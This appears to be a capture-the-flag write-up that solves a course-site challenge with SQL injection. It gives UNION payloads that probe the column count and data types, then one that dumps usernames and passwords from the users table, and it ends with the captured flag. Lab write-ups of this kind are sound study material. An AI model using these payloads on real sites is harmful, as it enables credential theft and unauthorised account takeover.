Login as Rejesh and go to any course.In search section we have to implement the union attack.
First determine Number of columns by trying:
(If Number of columns do not match then in response we will get all users)
Rajesh' UNION Select NULL from users --<space>
Rajesh' UNION Select NULL,NULL from users --<space>
Rajesh' UNION Select NULL,NULL,NULL from users --<space>

(If Number of columns  matches then in response we will get a row with Rajesh's details and a row with all NULL values)
Rajesh' UNION Select NULL,NULL,NULL,NULL from users --<space>

We infer that the query returns 4 columns

Now we have to check data types of all the columns
we can check by 
Rajesh' UNION Select "a",NULL,NULL,NULL from users --<space>
Rajesh' UNION Select NULL,"a",NULL,NULL from users --<space>
Rajesh' UNION Select NULL,NULL,"a",NULL from users --<space>
Rajesh' UNION Select NULL,NULL,NULL,"a" from users --<space>

like that we have to keep on checking

Finally the union attack:

' UNION SELECT NULL,CONCAT(username, ": ", password),NULL,NULL from users --<space>

after getting the admin username and password we will login as admin and change waitlist status of Rajesh and get the flag

FLAG{bsmv6RVaaVi8EdEqdsZJPBiouoOZhHSO}
